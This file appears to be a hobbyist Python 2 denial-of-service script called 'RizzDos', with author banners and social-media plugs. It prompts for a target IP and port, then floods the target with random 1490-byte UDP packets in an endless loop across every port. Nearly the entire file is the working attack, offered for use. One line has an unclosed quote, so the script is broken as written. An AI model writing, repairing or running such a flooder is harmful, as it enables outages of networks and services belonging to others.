# -- coding = utf-8 --
# CIE YNG NGINTIP

"follow ig jalanyanglurus_"
"sub to MRH Official"
"telegram http://t.me/MRH404"

import os, sys
import time
import random

putih="\x1b[1;97m"
merah="\x1b[1;91m"
hijau="\x1b[1;92m"
red= '\033[91m'
orange= '\33[38;5;208m'
green= '\033[92m'
cyan= '\033[36m'
bold= '\033[1m'
end= '\033[0m'

import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("toilet -f big RizzDos | lolcat")
os.system("date | lolcat)
print '---------------------------------------------------'
print cyan+' Author  : '+green+'RizzSploit {ThreRata92} '
print cyan+' Github  : '+green+'http://github.com/RizzSploit '
print cyan+' Youtube : '+green+'RizzSploit '                   
print putih+'---------------------------------------------------'
print ''
print
ip = raw_input("IP Target : ")
port = input("Port       : ")

os.system("clear")
os.system("figlet Attack Starting")
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print green+"Sent %s " +merah+ "Attacking Thats IP %s port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1